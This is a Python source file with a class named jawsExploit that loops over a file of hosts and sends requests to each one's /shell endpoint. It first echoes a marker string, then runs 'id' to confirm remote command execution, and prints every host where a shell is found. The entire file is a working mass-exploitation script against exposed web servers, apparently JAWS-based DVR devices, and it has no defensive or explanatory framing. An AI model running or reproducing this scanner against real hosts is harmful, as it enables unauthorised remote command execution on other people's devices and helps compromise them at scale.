import urllib.error, urllib.request, os, sys, requests
from host import host
class jawsExploit:
    def jawsRceExploit(self):
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                url = "http://" + address['ip'] + ":" + str(address['port']) + "/shell?echo+'argo-exploit'"
                r = requests.get(url)
                if 'argo-exploit' in r.text and "'argo-exploit'" not in r.text:
                    exploitUrl = url = "http://" + address['ip'] + ":" + str(address['port']) + "/shell?id"
                    rExploit = requests.get(exploitUrl)
                    if 'uid' in rExploit.text:
                        print("[#] Found shell on " + url + " with user "+ rExploit.text)
            except:
                pass
            a += 1
